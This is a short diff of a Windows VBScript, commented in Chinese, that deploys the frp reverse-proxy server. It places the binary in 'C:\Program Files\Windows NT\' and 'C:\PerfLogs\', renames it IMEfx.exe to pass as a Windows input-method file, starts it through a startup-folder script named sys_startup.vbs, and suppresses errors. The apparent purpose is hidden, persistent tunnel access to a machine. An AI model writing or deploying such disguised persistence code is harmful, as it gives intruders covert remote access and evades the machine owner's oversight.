@@ -2,9 +2,10 @@
 ' "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" 系统启动目录脚本无权限，手动复制并命名为 sys_startup.vbs
 On Error Resume Next
 
-Dim dir_bak,dir_run,frp,frpini,frp_run,frpini_run,startup_dir
+Dim dir_bak,dir_run,frp,frpini,frp_run,frpini_run
 dir_bak = "C:\Program Files\Windows NT\"
 dir_run = "C:\PerfLogs\"
+' ----- 将 frp 、frpini、frp_windows.vbs 文件放到 dir_bak 运行即可 -----
 frp = "frps_windows_amd64.exe"
 frpini = "frps.ini"
 frp_run = "IMEfx.exe"
